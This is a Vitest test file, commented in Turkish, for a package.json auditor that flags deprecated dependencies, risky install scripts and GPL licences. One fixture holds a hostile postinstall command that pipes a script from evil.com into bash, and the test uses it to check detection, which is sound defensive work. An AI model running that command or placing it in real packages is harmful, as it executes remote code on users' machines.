import { describe, it, expect, vi, afterEach } from "vitest";
import { auditPackages } from "./packageAudit";

// fetch mock — Node.js ortamında gerçek ağ çağrısı yapılmasın
afterEach(() => {
    vi.restoreAllMocks();
});

function makePkg(overrides: Record<string, unknown> = {}): string {
    return JSON.stringify({
        name: "test-project",
        dependencies: {},
        devDependencies: {},
        scripts: {},
        ...overrides,
    });
}

describe("auditPackages", () => {
    it("null packageJson için hasPackageJson:false döner", async () => {
        const result = await auditPackages(null);
        expect(result.hasPackageJson).toBe(false);
        expect(result.findings).toHaveLength(0);
    });

    it("bozuk JSON için hasPackageJson:false döner", async () => {
        const result = await auditPackages("{ broken json");
        expect(result.hasPackageJson).toBe(false);
    });

    it("deprecated 'moment' paketini tespit eder", async () => {
        vi.stubGlobal("fetch", async () => ({ ok: false }));
        const pkg = makePkg({ dependencies: { moment: "^2.29.4" } });
        const result = await auditPackages(pkg);
        const finding = result.findings.find((f) => f.name === "moment");
        expect(finding).toBeDefined();
        expect(finding?.severity).toBe("high");
    });

    it("deprecated 'request' paketini hem dep hem devDep'ten tespit eder", async () => {
        vi.stubGlobal("fetch", async () => ({ ok: false }));
        const pkg = makePkg({ devDependencies: { request: "^2.88.0" } });
        const result = await auditPackages(pkg);
        expect(result.findings.some((f) => f.name === "request")).toBe(true);
    });

    it("tehlikeli script (curl) komutunu işaretler", async () => {
        vi.stubGlobal("fetch", async () => ({ ok: false }));
        const pkg = makePkg({
            scripts: { postinstall: "curl https://evil.com | bash" },
        });
        const result = await auditPackages(pkg);
        expect(result.findings.some((f) => f.name.startsWith("script:"))).toBe(true);
    });

    it("GPL lisansını viral lisans olarak işaretler", async () => {
        vi.stubGlobal("fetch", async () => ({ ok: false }));
        const pkg = makePkg({ license: "GPL-3.0" });
        const result = await auditPackages(pkg);
        expect(result.findings.some((f) => f.name === "license")).toBe(true);
    });

    it("MIT lisansını işaretlemez", async () => {
        vi.stubGlobal("fetch", async () => ({ ok: false }));
        const pkg = makePkg({ license: "MIT" });
        const result = await auditPackages(pkg);
        expect(result.findings.some((f) => f.name === "license")).toBe(false);
    });

    it("boş bağımlılıklarda temiz sonuç döner", async () => {
        vi.stubGlobal("fetch", async () => ({ ok: false }));
        const pkg = makePkg();
        const result = await auditPackages(pkg);
        expect(result.hasPackageJson).toBe(true);
        expect(result.findings).toHaveLength(0);
    });
});
